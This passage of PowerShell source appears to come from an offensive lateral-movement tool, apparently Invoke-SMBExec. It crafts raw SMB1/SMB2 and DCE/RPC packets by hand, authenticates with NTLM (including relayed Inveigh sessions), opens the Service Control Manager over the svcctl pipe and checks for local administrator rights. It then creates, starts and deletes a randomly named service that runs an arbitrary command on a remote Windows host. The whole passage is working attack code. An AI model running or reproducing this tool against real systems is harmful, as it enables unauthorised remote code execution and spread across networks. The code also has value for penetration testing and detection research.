                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $SMB2_message_ID += 1
                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            }

            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
            $SMB_client_stream.Flush()
            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

            if($SMB_version -eq 'SMB1')
            {

                if([System.BitConverter]::ToString($SMB_client_receive[9..12]) -eq '00-00-00-00')
                {
                    Write-Verbose "$output_username successfully authenticated on $Target"
                    $login_successful = $true
                }
                else
                {
                    Write-Output "$output_username failed to authenticate on $Target"
                    $login_successful = $false
                }

            }
            else
            {
                if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -eq '00-00-00-00')
                {
                    Write-Verbose "$output_username successfully authenticated on $Target"
                    $login_successful = $true
                }
                else
                {
                    Write-Output "$output_username failed to authenticate on $Target"
                    $login_successful = $false
                }

            }

        }

    }

    if($login_successful -or $session_string)
    {

        if($session_string)
        {

            if($session_string -and $inveigh.session_lock_table[$session] -eq 'locked')
            {
                Write-Output "[*] Pausing due to Inveigh Relay session lock"
                Start-Sleep -s 2
            }

            $inveigh.session_lock_table[$session] = 'locked'
            $SMB_client = $inveigh.session_socket_table[$session]
            $SMB_client_stream = $SMB_client.GetStream()
            $SMB_session_ID = $inveigh.session_table[$session]
            $SMB2_message_ID =  $inveigh.session_message_ID_table[$session]
            $SMB2_tree_ID = 0x00,0x00,0x00,0x00
        }

        $SMB_path = "\\" + $Target + "\IPC$"

        if($SMB_version -eq 'SMB1')
        {
            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00
        }
        else
        {
            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        }

        $SMB_named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03

        if(!$Service)
        {
            $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
            $SMB_service = $SMB_service_random -replace "-00",""
            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)
            $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
            $SMB_service_random += '00-00-00-00-00'
            $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        else
        {
            $SMB_service = $Service
            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_service)

            if([Bool]($SMB_service.Length % 2))
            {
                $SMB_service_bytes += 0x00,0x00
            }
            else
            {
                $SMB_service_bytes += 0x00,0x00,0x00,0x00
                
            }

        }
        
        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)

        if($CommandCOMSPEC -eq 'Y')
        {
            $Command = "%COMSPEC% /C `"" + $Command + "`""
        }
        else
        {
            $Command = "`"" + $Command + "`""
        }

        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += "{0:X2}-00-" -f $_}

        if([Bool]($Command.Length % 2))
        {
            $SMBExec_command += '00-00'
        }
        else
        {
            $SMBExec_command += '00-00-00-00'
        }    
        
        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)
        $SMB_split_index = 4256
        
        if($SMB_version -eq 'SMB1')
        {
            $SMB_client_stage = 'TreeConnectAndXRequest'

            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
            {
            
                switch ($SMB_client_stage)
                {
            
                    'TreeConnectAndXRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'CreateAndXRequest'
                    }
                  
                    'CreateAndXRequest'
                    {
                        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
                        $SMB_tree_ID = $SMB_client_receive[28,29]
                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'RPCBind'
                    }
                
                    'RPCBind'
                    {
                        $SMB_FID = $SMB_client_receive[42,43]
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_RPC_data = New-PacketRPCBind 1 0xb8,0x10 0x01 0x00,0x00 $SMB_named_pipe_UUID 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'OpenSCManagerW'
                    }
               
                    'ReadAndXRequest'
                    {
                        Start-Sleep -m $Sleep
                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBReadAndXRequest $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = $SMB_client_stage_next
                    }
                
                    'OpenSCManagerW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'CheckAccess'           
                    }

                    'CheckAccess'
                    {

                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            $SMB_service_manager_context_handle = $SMB_client_receive[88..107]

                            if($SMB_execute)
                            {
                                Write-Verbose "$output_username is a local administrator on $Target"  
                                $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                if($SCM_data.Length -lt $SMB_split_index)
                                {
                                    $SMB_client_stage = 'CreateServiceW'
                                }
                                else
                                {
                                    $SMB_client_stage = 'CreateServiceW_First'
                                }

                            }
                            else
                            {
                                Write-Output "$output_username is a local administrator on $Target"
                                $SMB_close_service_handle_stage = 2
                                $SMB_client_stage = 'CloseServiceHandle'
                            }

                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '05-00-00-00')
                        {
                            Write-Output "$output_username is not a local administrator or does not have required privilege on $Target"
                            $SMBExec_failed = $true
                        }
                        else
                        {
                            Write-Output "Something went wrong with $Target"
                            $SMBExec_failed = $true
                        }

                    }
                
                    'CreateServiceW'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'StartServiceW'
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SMB_split_stage_final -le 2)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_split_stage = 2
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SMB_split_stage -ge $SMB_split_stage_final)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Last'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x48 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadAndXRequest'
                        $SMB_client_stage_next = 'StartServiceW'
                    }

                    'StartServiceW'
                    {
                    
                        if([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '00-00-00-00')
                        {
                            Write-Verbose "Service $SMB_service created on $Target"
                            $SMB_service_context_handle = $SMB_client_receive[92..111]
                            $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                                $SMB_signing_counter = $SMB_signing_counter + 2 
                                [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                                $packet_SMB_header["Signature"] = $SMB_signing_sequence
                            }

                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                            $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             
                            $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                                $SMB_signature = $MD5.ComputeHash($SMB_sign)
                                $SMB_signature = $SMB_signature[0..7]
                                $packet_SMB_header["Signature"] = $SMB_signature
                                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            Write-Verbose "Trying to execute command on $Target"
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadAndXRequest'
                            $SMB_client_stage_next = 'DeleteServiceW'  
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '31-04-00-00')
                        {
                            Write-Output "Service $SMB_service creation failed on $Target"
                            $SMBExec_failed = $true
                        }
                        else
                        {
                            Write-Output "Service creation fault context mismatch"
                            $SMBExec_failed = $true
                        }
    
                    }
                
                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '1d-04-00-00')
                        {
                            Write-Output "Command executed with service $SMB_service on $Target"
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[88..91]) -eq '02-00-00-00')
                        {
                            Write-Output "Service $SMB_service failed to start on $Target"
                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
